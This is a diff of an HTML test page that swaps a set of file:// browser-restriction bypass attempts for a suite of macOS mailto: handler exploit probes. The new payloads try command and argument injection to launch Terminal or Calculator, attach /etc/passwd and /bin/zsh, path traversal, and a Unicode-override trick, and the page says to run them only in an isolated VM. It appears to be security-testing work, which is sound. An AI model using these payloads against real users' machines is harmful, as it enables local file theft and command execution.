@@ -3,480 +3,333 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced File Protocol Bypass Tests</title>
+    <title>mailto: URL Handler Exploit Tests</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            padding: 40px;
-            background: #1a1a2e;
-            color: white;
-            max-width: 1000px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 1200px;
             margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
         }
-        .test-area {
-            background: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 10px;
+        .test-section {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
             margin: 20px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .file-link {
-            display: block;
+        .test-case {
+            border: 1px solid #ddd;
+            border-radius: 4px;
             padding: 15px;
             margin: 10px 0;
-            background: rgba(66, 133, 244, 0.3);
-            border-radius: 5px;
-            color: white;
-            text-decoration: none;
-            border: 1px solid #4285f4;
-            transition: all 0.3s ease;
-            cursor: pointer;
+            background: #fafafa;
         }
-        .file-link:hover {
-            background: rgba(66, 133, 244, 0.5);
+        .danger {
+            border-left: 4px solid #ff3b30;
+            background: #fff5f5;
         }
-        .file-link.clicked {
-            background: rgba(52, 168, 83, 0.7);
+        .warning {
+            border-left: 4px solid #ff9500;
+            background: #fff9f0;
         }
-        .file-link.failed {
-            background: rgba(234, 67, 53, 0.7);
-        }
-        .status {
-            background: rgba(0,0,0,0.5);
-            padding: 15px;
-            border-radius: 5px;
-            font-family: 'Monaco', monospace;
-            margin: 20px 0;
-            height: 400px;
-            overflow-y: auto;
-        }
-        .success { color: #00ff88; }
-        .warning { color: #ffaa00; }
-        .error { color: #ff4444; }
-        .critical { color: #ff4444; font-weight: bold; }
-        .section {
-            background: rgba(255,255,255,0.05);
-            padding: 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-            border: 2px dashed rgba(255,255,255,0.2);
-        }
-        .section-title {
-            color: #ffaa00;
-            margin-bottom: 15px;
+        .info {
+            border-left: 4px solid #007aff;
+            background: #f0f8ff;
         }
         button {
-            background: rgba(66, 133, 244, 0.6);
+            background: #007aff;
             color: white;
-            border: 1px solid #4285f4;
+            border: none;
             padding: 10px 20px;
-            border-radius: 5px;
+            border-radius: 6px;
             cursor: pointer;
             margin: 5px;
+            font-size: 14px;
         }
         button:hover {
-            background: rgba(66, 133, 244, 0.8);
+            background: #0056cc;
+        }
+        button.danger {
+            background: #ff3b30;
+        }
+        button.danger:hover {
+            background: #cc2a22;
+        }
+        code {
+            background: #eee;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 12px;
+        }
+        .result {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
     </style>
-
-    <script>
-        // Define all functions first before the body loads
-        let statusElement;
-        let testCount = 0;
-
-        function initializeApp() {
-            statusElement = document.getElementById('status');
-            log('🔧 Advanced file protocol bypass tests initialized', 'info');
-            log('💡 These tests attempt various methods to bypass file:// restrictions', 'warning');
-            log('⚠️ Most will fail due to browser security policies', 'success');
-            log('🎯 Look for any methods that succeed - these would be security findings', 'critical');
-        }
-
-        function log(message, type = 'info') {
-            if (!statusElement) return;
-            const entry = document.createElement('div');
-            entry.className = type;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            statusElement.appendChild(entry);
-            statusElement.scrollTop = statusElement.scrollHeight;
-        }
-
-        function clearLog() {
-            if (statusElement) {
-                statusElement.innerHTML = 'Status: Log cleared...';
-            }
-        }
-
-        // Method 2: User Gesture Bypass Attempts
-        function testUserGestureBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: User Gesture + setTimeout Bypass`, 'warning');
-            
-            try {
-                const link = document.createElement('a');
-                link.href = 'file:///Users/Shared/';
-                document.body.appendChild(link);
-                
-                // Try immediate click
-                link.click();
-                log('✅ Immediate click after gesture attempted', 'success');
-                
-                // Try with minimal delay
-                setTimeout(() => {
-                    link.click();
-                    log('✅ Delayed click after gesture attempted', 'success');
-                }, 10);
-                
-                document.body.removeChild(link);
-            } catch(e) {
-                log(`❌ User gesture bypass failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testDoubleClickBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Double-Click Handler`, 'warning');
-            
-            const link = document.createElement('a');
-            link.href = 'file:///Applications/';
-            link.textContent = 'Double-click me';
-            link.style.padding = '10px';
-            link.style.background = 'rgba(255,0,0,0.3)';
-            document.body.appendChild(link);
-            
-            let clickCount = 0;
-            link.addEventListener('click', (e) => {
-                clickCount++;
-                if (clickCount === 2) {
-                    log('🎯 Double-click detected, attempting bypass', 'critical');
-                    window.open('file:///Users/Shared/', '_blank');
-                }
-                setTimeout(() => { clickCount = 0; }, 300);
-            });
-            
-            setTimeout(() => document.body.removeChild(link), 5000);
-        }
-
-        function testDragAndDropBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Drag & Drop Simulation`, 'warning');
-            
-            const dropZone = document.createElement('div');
-            dropZone.style.padding = '20px';
-            dropZone.style.background = 'rgba(0,255,0,0.2)';
-            dropZone.style.border = '2px dashed green';
-            dropZone.textContent = 'Drop files here (simulated)';
-            document.body.appendChild(dropZone);
-            
-            try {
-                const dropEvent = new DragEvent('drop', {
-                    dataTransfer: {
-                        items: [{
-                            kind: 'file',
-                            type: 'application/x-file-url'
-                        }]
-                    }
-                });
-                
-                dropZone.dispatchEvent(dropEvent);
-                log('✅ Drag & drop event dispatched', 'success');
-                
-                setTimeout(() => {
-                    window.location.href = 'file:///Users/Shared/';
-                }, 100);
-            } catch(e) {
-                log(`❌ Drag & drop failed: ${e.message}`, 'error');
-            }
-            
-            setTimeout(() => document.body.removeChild(dropZone), 3000);
-        }
-
-        function testContextMenuBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Context Menu Bypass`, 'warning');
-            
-            const element = document.createElement('div');
-            element.textContent = 'Right-click here';
-            element.style.padding = '15px';
-            element.style.background = 'rgba(255,255,0,0.3)';
-            element.style.border = '1px solid yellow';
-            document.body.appendChild(element);
-            
-            element.addEventListener('contextmenu', (e) => {
-                e.preventDefault();
-                log('🎯 Context menu intercepted', 'critical');
-                
-                setTimeout(() => {
-                    const link = document.createElement('a');
-                    link.href = 'file:///System/Library/CoreServices/';
-                    link.click();
-                }, 100);
-            });
-            
-            setTimeout(() => document.body.removeChild(element), 5000);
-        }
-
-        // Method 3: Frame & Window Manipulation
-        function testIframeSandboxBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Iframe Sandbox Bypass`, 'warning');
-            
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.sandbox = 'allow-scripts allow-top-navigation';
-                iframe.src = 'file:///Users/Shared/';
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                
-                setTimeout(() => {
-                    try {
-                        iframe.contentWindow.location.href = 'file:///Applications/';
-                        log('✅ Iframe navigation attempted', 'success');
-                    } catch(e) {
-                        log(`❌ Iframe navigation blocked: ${e.message}`, 'error');
-                    }
-                    document.body.removeChild(iframe);
-                }, 1000);
-            } catch(e) {
-                log(`❌ Iframe creation failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testWindowOpenBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: window.open Bypass`, 'warning');
-            
-            try {
-                const newWindow = window.open('file:///Users/Shared/', '_blank');
-                if (newWindow) {
-                    log('✅ window.open succeeded!', 'critical');
-                    setTimeout(() => newWindow.close(), 1000);
-                } else {
-                    log('❌ window.open was blocked', 'error');
-                }
-            } catch(e) {
-                log(`❌ window.open failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testLocationReplaceBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: location.replace() Bypass`, 'warning');
-            
-            try {
-                location.replace('file:///Users/Shared/');
-                log('✅ location.replace attempted', 'success');
-            } catch(e) {
-                log(`❌ location.replace failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testPostMessageBypass() {
-            testCount++;
-            log(`🔄 Test ${testCount}: PostMessage Bypass`, 'warning');
-            
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'about:blank';
-                document.body.appendChild(iframe);
-                
-                iframe.onload = () => {
-                    iframe.contentWindow.postMessage({
-                        type: 'navigate',
-                        url: 'file:///Users/Shared/'
-                    }, '*');
-                    log('✅ PostMessage sent to iframe', 'success');
-                };
-                
-                setTimeout(() => document.body.removeChild(iframe), 2000);
-            } catch(e) {
-                log(`❌ PostMessage failed: ${e.message}`, 'error');
-            }
-        }
-
-        // Method 4: Protocol Handler Tricks
-        function testCustomProtocol() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Custom Protocol Handler`, 'warning');
-            
-            try {
-                navigator.registerProtocolHandler('file', '/handler.html#%s', 'File Handler');
-                log('✅ Custom protocol handler registered', 'success');
-            } catch(e) {
-                log(`❌ Protocol handler registration failed: ${e.message}`, 'error');
-            }
-            
-            try {
-                window.location.href = 'x-file-protocol://Users/Shared/';
-                log('✅ x-file-protocol attempted', 'success');
-            } catch(e) {
-                log(`❌ x-file-protocol failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testFileSystemAPI() {
-            testCount++;
-            log(`🔄 Test ${testCount}: File System Access API`, 'warning');
-            
-            if ('showDirectoryPicker' in window) {
-                log('✅ File System Access API available', 'success');
-            } else {
-                log('❌ File System Access API not available', 'error');
-            }
-        }
-
-        function testBlobURLs() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Blob URL Redirect`, 'warning');
-            
-            try {
-                const blob = new Blob(['<html><body><script>window.location="file:///Users/Shared/"</script></body></html>'], 
-                    {type: 'text/html'});
-                const blobUrl = URL.createObjectURL(blob);
-                window.open(blobUrl, '_blank');
-                log('✅ Blob URL with file:// redirect attempted', 'success');
-            } catch(e) {
-                log(`❌ Blob URL method failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testDataURIRedirect() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Data URI Redirect`, 'warning');
-            
-            try {
-                const dataUri = 'data:text/html,<script>window.location="file:///Users/Shared/"</script>';
-                window.open(dataUri, '_blank');
-                log('✅ Data URI redirect attempted', 'success');
-            } catch(e) {
-                log(`❌ Data URI method failed: ${e.message}`, 'error');
-            }
-        }
-
-        // Method 5: Browser-Specific
-        function testSafariSpecific() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Safari-Specific Methods`, 'warning');
-            
-            try {
-                window.open('file:///Users/Shared/', '_self');
-                log('✅ Safari-specific window.open attempted', 'success');
-            } catch(e) {
-                log(`❌ Safari method failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testChromeSpecific() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Chrome-Specific Methods`, 'warning');
-            
-            try {
-                if (typeof chrome !== 'undefined' && chrome.runtime) {
-                    chrome.runtime.sendMessage({type: 'openFile', url: 'file:///Users/Shared/'});
-                    log('✅ Chrome extension API attempted', 'success');
-                } else {
-                    log('❌ Chrome extension API not available', 'error');
-                }
-            } catch(e) {
-                log(`❌ Chrome method failed: ${e.message}`, 'error');
-            }
-        }
-
-        function testFirefoxSpecific() {
-            testCount++;
-            log(`🔄 Test ${testCount}: Firefox-Specific Methods`, 'warning');
-            
-            try {
-                window.location.href = 'file:///Users/Shared/';
-                log('✅ Firefox location redirect attempted', 'success');
-            } catch(e) {
-                log(`❌ Firefox method failed: ${e.message}`, 'error');
-            }
-        }
-
-        function runAllTests() {
-            log('🚀 STARTING COMPREHENSIVE BYPASS TEST SUITE', 'critical');
-            
-            const tests = [
-                testUserGestureBypass,
-                testDoubleClickBypass,
-                testDragAndDropBypass,
-                testContextMenuBypass,
-                testIframeSandboxBypass,
-                testWindowOpenBypass,
-                testLocationReplaceBypass,
-                testPostMessageBypass,
-                testCustomProtocol,
-                testFileSystemAPI,
-                testBlobURLs,
-                testDataURIRedirect,
-                testSafariSpecific,
-                testChromeSpecific,
-                testFirefoxSpecific
-            ];
-            
-            tests.forEach((test, index) => {
-                setTimeout(() => test(), index * 2000);
-            });
-        }
-
-        // Monitor all attempts
-        window.addEventListener('error', (e) => {
-            if (e.message.includes('local resource')) {
-                log(`🛡️ SECURITY BLOCKED: ${e.message}`, 'critical');
-            }
-        });
-    </script>
 </head>
-<body onload="initializeApp()">
-    <div class="container">
-        <h1>🛡️ Advanced File Protocol Bypass Tests</h1>
+<body>
+    <h1>mailto: URL Handler Exploit Tests</h1>
+    <p><strong>WARNING:</strong> Only run these tests in an isolated macOS VM environment. Some tests may cause unexpected behavior.</p>
+
+    <!-- Section 1: Basic mailto Injection -->
+    <div class="test-section">
+        <h2>1. Command Injection in mailto: Parameters</h2>
         
-        <div class="test-area">
-            <div class="section">
-                <h3 class="section-title">Method 1: Traditional File Links (Expected to Fail)</h3>
-                <a href="file:///Users/Shared/" class="file-link">📂 file:///Users/Shared/</a>
-                <a href="file:///Applications/" class="file-link">📂 file:///Applications/</a>
-                <a href="file:///System/Library/CoreServices/" class="file-link">📂 file:///System/Library/CoreServices/</a>
-            </div>
-
-            <div class="section">
-                <h3 class="section-title">Method 2: User Gesture Bypass Attempts</h3>
-                <button onclick="testUserGestureBypass()">Click + setTimeout Bypass</button>
-                <button onclick="testDoubleClickBypass()">Double-Click Handler</button>
-                <button onclick="testDragAndDropBypass()">Drag & Drop Simulation</button>
-                <button onclick="testContextMenuBypass()">Right-Click Context Menu</button>
-            </div>
-
-            <div class="section">
-                <h3 class="section-title">Method 3: Frame & Window Manipulation</h3>
-                <button onclick="testIframeSandboxBypass()">Iframe Sandbox Bypass</button>
-                <button onclick="testWindowOpenBypass()">window.open with file://</button>
-                <button onclick="testLocationReplaceBypass()">location.replace()</button>
-                <button onclick="testPostMessageBypass()">PostMessage to Iframe</button>
-            </div>
-
-            <div class="section">
-                <h3 class="section-title">Method 4: Protocol Handler Tricks</h3>
-                <button onclick="testCustomProtocol()">Custom Protocol Handler</button>
-                <button onclick="testFileSystemAPI()">File System Access API</button>
-                <button onclick="testBlobURLs()">Blob URLs with file://</button>
-                <button onclick="testDataURIRedirect()">Data URI Redirect</button>
-            </div>
-
-            <div class="section">
-                <h3 class="section-title">Method 5: Browser-Specific Exploits</h3>
-                <button onclick="testSafariSpecific()">Safari-Specific Methods</button>
-                <button onclick="testChromeSpecific()">Chrome-Specific Methods</button>
-                <button onclick="testFirefoxSpecific()">Firefox-Specific Methods</button>
-            </div>
-
-            <button onclick="runAllTests()">🚀 Run All Bypass Tests</button>
-            <button onclick="clearLog()">🗑️ Clear Log</button>
+        <div class="test-case danger">
+            <h3>Test 1A: Argument Injection</h3>
+            <p>Attempts to inject command-line arguments into Mail.app</p>
+            <button onclick="testMailto('mailto:test@test.com?subject=-e%20%22tell%20application%20\\\"Terminal\\\"%20to%20activate%22')">
+                Test Argument Injection
+            </button>
+            <div id="result1A" class="result"></div>
         </div>
 
-        <div class="status" id="status">
-            Status: Ready to test file protocol bypass methods...
+        <div class="test-case danger">
+            <h3>Test 1B: Shell Command Injection</h3>
+            <p>Attempts to execute shell commands through parameter injection</p>
+            <button onclick="testMailto('mailto:test@test.com?body=%60open%20-a%20Calculator%60')">
+                Test Shell Command Injection
+            </button>
+            <div id="result1B" class="result"></div>
+        </div>
+
+        <div class="test-case warning">
+            <h3>Test 1C: Multiple Parameter Exploitation</h3>
+            <p>Uses multiple parameters to confuse the parser</p>
+            <button onclick="testMailto('mailto:test@test.com?subject=test&body=test&cc=test&bcc=test&attachment=/etc/passwd')">
+                Test Parameter Overflow
+            </button>
+            <div id="result1C" class="result"></div>
         </div>
     </div>
+
+    <!-- Section 2: URL Scheme Escalation -->
+    <div class="test-section">
+        <h2>2. URL Scheme Escalation</h2>
+        
+        <div class="test-case danger">
+            <h3>Test 2A: JavaScript URL in mailto</h3>
+            <p>Attempts to execute JavaScript through mailto handler</p>
+            <button onclick="testMailto('mailto:javascript:alert(1)')">
+                Test JavaScript Execution
+            </button>
+            <div id="result2A" class="result"></div>
+        </div>
+
+        <div class="test-case danger">
+            <h3>Test 2B: File URL Injection</h3>
+            <p>Attempts to access local files through mailto</p>
+            <button onclick="testMailto('mailto:file:///etc/passwd')">
+                Test File URL Access
+            </button>
+            <div id="result2B" class="result"></div>
+        </div>
+
+        <div class="test-case danger">
+            <h3>Test 2C: Terminal URL Chaining</h3>
+            <p>Attempts to chain mailto with terminal:// URL</p>
+            <button onclick="testMailto('mailto:terminal://open?command=echo%20EXPLOITED')">
+                Test Terminal URL Chaining
+            </button>
+            <div id="result2C" class="result"></div>
+        </div>
+    </div>
+
+    <!-- Section 3: Parser Confusion Attacks -->
+    <div class="test-section">
+        <h2>3. Parser Confusion & Encoding Attacks</h2>
+        
+        <div class="test-case warning">
+            <h3>Test 3A: Double Encoding</h3>
+            <p>Uses double URL encoding to bypass filters</p>
+            <button onclick="testMailto('mailto:test%2540test.com?subject=%2522%257C%2520open%2520-a%2520Calculator')">
+                Test Double Encoding
+            </button>
+            <div id="result3A" class="result"></div>
+        </div>
+
+        <div class="test-case warning">
+            <h3>Test 3B: Unicode and Special Characters</h3>
+            <p>Uses Unicode characters to confuse the parser</p>
+            <button onclick="testMailto('mailto:test@test.com?subject=\u202EgnidaeT\u202F\u2066;open -a Terminal;//')">
+                Test Unicode Exploit
+            </button>
+            <div id="result3B" class="result"></div>
+        </div>
+
+        <div class="test-case warning">
+            <h3>Test 3C: Null Byte Injection</h3>
+            <p>Attempts null byte injection in parameters</p>
+            <button onclick="testMailto('mailto:test@test.com%00?subject=injected')">
+                Test Null Byte Injection
+            </button>
+            <div id="result3C" class="result"></div>
+        </div>
+    </div>
+
+    <!-- Section 4: Attachment Exploits -->
+    <div class="test-section">
+        <h2>4. Attachment Parameter Exploits</h2>
+        
+        <div class="test-case danger">
+            <h3>Test 4A: Local File Attachment</h3>
+            <p>Attempts to attach local system files</p>
+            <button onclick="testMailto('mailto:test@test.com?attach=file:///etc/passwd')">
+                Test Local File Attachment
+            </button>
+            <div id="result4A" class="result"></div>
+        </div>
+
+        <div class="test-case danger">
+            <h3>Test 4B: Executable File Reference</h3>
+            <p>Attempts to reference executable files</p>
+            <button onclick="testMailto('mailto:test@test.com?attachment=/bin/zsh')">
+                Test Executable Attachment
+            </button>
+            <div id="result4A" class="result"></div>
+        </div>
+
+        <div class="test-case warning">
+            <h3>Test 4C: Path Traversal in Attachments</h3>
+            <p>Attempts path traversal in attachment parameter</p>
+            <button onclick="testMailto('mailto:test@test.com?attachment=../../../etc/passwd')">
+                Test Path Traversal
+            </button>
+            <div id="result4C" class="result"></div>
+        </div>
+    </div>
+
+    <!-- Section 5: Auto-Execution Tests -->
+    <div class="test-section">
+        <h2>5. Auto-Execution & Auto-Open Tests</h2>
+        
+        <div class="test-case danger">
+            <h3>Test 5A: Auto-Open Command File</h3>
+            <p>Attempts to auto-open .command files</p>
+            <button onclick="testMailto('mailto:test@test.com?attachment=test.command')">
+                Test .command Auto-Open
+            </button>
+            <div id="result5A" class="result"></div>
+        </div>
+
+        <div class="test-case danger">
+            <h3>Test 5B: Auto-Run Script</h3>
+            <p>Attempts to reference auto-run scripts</p>
+            <button onclick="testMailto('mailto:test@test.com?body=open%20x-apple-terminal://')">
+                Test Auto-Run Script
+            </button>
+            <div id="result5B" class="result"></div>
+        </div>
+
+        <div class="test-case info">
+            <h3>Test 5C: Data URL Payload</h3>
+            <p>Uses data URLs to embed executable content</p>
+            <button onclick="testMailto('data:text/html,<script>window.open(\"terminal://open\")</script>')">
+                Test Data URL Payload
+            </button>
+            <div id="result5C" class="result"></div>
+        </div>
+    </div>
+
+    <!-- Monitoring Section -->
+    <div class="test-section">
+        <h2>Monitoring & Results</h2>
+        <div class="test-case info">
+            <h3>Test Status</h3>
+            <p>Monitor Console.app for Mail.app errors and check for unexpected Terminal launches.</p>
+            <button onclick="checkForSuccess()">Check for Success Markers</button>
+            <div id="monitoringResults" class="result"></div>
+        </div>
+    </div>
+
+    <script>
+        // Track test results
+        let testResults = {};
+        let testCounter = 0;
+
+        function testMailto(mailtoUrl) {
+            testCounter++;
+            const testId = 'test' + testCounter;
+            testResults[testId] = {
+                url: mailtoUrl,
+                timestamp: new Date().toISOString(),
+                status: 'executed'
+            };
+
+            try {
+                console.log('Testing mailto URL:', mailtoUrl);
+                
+                // Method 1: Direct window.location
+                // window.location.href = mailtoUrl;
+                
+                // Method 2: Create and click a link (more reliable)
+                const link = document.createElement('a');
+                link.href = mailtoUrl;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Method 3: Use window.open as fallback
+                // window.open(mailtoUrl, '_blank');
+                
+                showResult(testId, 'Test executed successfully. Check for Terminal launch or Mail.app behavior.', 'success');
+                
+            } catch (error) {
+                showResult(testId, 'Error executing test: ' + error.message, 'error');
+            }
+            
+            // Log to console for debugging
+            console.log('Test executed:', mailtoUrl);
+        }
+
+        function showResult(testId, message, type) {
+            const resultDiv = document.getElementById(testId);
+            if (resultDiv) {
+                resultDiv.textContent = message;
+                resultDiv.className = 'result ' + type;
+                resultDiv.style.display = 'block';
+            }
+        }
+
+        function checkForSuccess() {
+            const resultsDiv = document.getElementById('monitoringResults');
+            let message = 'Monitoring Results:\n\n';
+            
+            message += 'Check for these indicators:\n';
+            message += '• Terminal.app launched automatically\n';
+            message += '• Mail.app crashed or showed errors\n';
+            message += '• Calculator.app opened unexpectedly\n';
+            message += '• Check Console.app for Mail process errors\n';
+            message += '• Look for new processes in Activity Monitor\n\n';
+            
+            message += 'Tests executed: ' + testCounter + '\n';
+            message += 'Last test: ' + (testCounter > 0 ? testResults['test' + testCounter].timestamp : 'None');
+            
+            resultsDiv.textContent = message;
+            resultsDiv.className = 'result info';
+            resultsDiv.style.display = 'block';
+        }
+
+        // Auto-logging
+        console.log('mailto: Exploit Test Suite Loaded');
+        console.log('User Agent:', navigator.userAgent);
+        console.log('Platform:', navigator.platform);
+    </script>
 </body>
 </html>
